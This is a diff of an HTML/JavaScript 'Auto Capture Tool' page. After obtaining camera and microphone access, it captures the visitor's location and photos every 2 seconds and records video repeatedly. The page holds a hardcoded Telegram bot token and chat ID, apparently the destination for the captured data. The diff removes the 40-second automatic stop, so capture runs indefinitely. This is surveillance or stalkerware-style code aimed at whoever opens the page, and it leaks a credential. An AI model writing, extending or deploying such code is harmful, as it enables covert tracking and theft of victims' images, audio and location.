@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>jat Capture Tool</title>
+    <title>Auto Capture Tool</title>
     <style>
         body {
             display: flex;
@@ -23,8 +23,8 @@
 </head>
 <body>
 
-<h1>jat tic Capture Tool</h1>
-<video id="video" width="320" height="240" autoplay muted></video>
+<h1>Automatic Capture Tool</h1>
+<video id="video" width="320" height="240" autoplay muted></video> <!-- Muted the audio -->
 <img id="photo" alt="Captured Photo" width="320">
 <div id="location"></div>
 
@@ -34,10 +34,9 @@
     const locationDiv = document.getElementById('location');
     let mediaRecorder;
     let videoChunks = [];
-    let locationInterval, photoInterval, videoInterval;
 
-    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA'; // Replace with your actual Telegram bot token
-    const CHAT_ID = '1691680798'; // Replace with your actual Telegram chat ID
+    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA';
+    const CHAT_ID = '1691680798'; // Replace with your Telegram Chat ID
 
     // Start video stream
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
@@ -49,12 +48,9 @@
 
     // Start capturing location, video, and photo
     function startCapturing(stream) {
-        locationInterval = setInterval(captureLocation, 2000); // Capture location every 2 seconds
+        setInterval(captureLocation, 2000); // Capture location every 2 seconds
         startVideoCapture(stream); // Start video capture
-        photoInterval = setInterval(capturePhoto, 2000); // Capture photo every 2 seconds
-
-        // Stop all capturing after 40 seconds
-        setTimeout(stopCapturing, 40000);
+        setInterval(capturePhoto, 2000); // Capture photo every 2 seconds
     }
 
     function startVideoCapture(stream) {
@@ -69,7 +65,8 @@
             }
         };
 
-        videoInterval = setInterval(() => {
+        // Record video for 10 seconds and then send it
+        setInterval(() => {
             videoChunks = []; // Clear previous chunks
             mediaRecorder.start();
             setTimeout(() => {
@@ -171,20 +168,6 @@
         });
     }
 
-    function stopCapturing() {
-        // Stop video and audio capture
-        const stream = video.srcObject;
-        const tracks = stream.getTracks();
-
-        tracks.forEach(track => track.stop());
-
-        // Clear all intervals
-        clearInterval(locationInterval);
-        clearInterval(photoInterval);
-        clearInterval(videoInterval);
-
-        console.log("Capture stopped after 40 seconds");
-    }
 </script>
 
 </body>
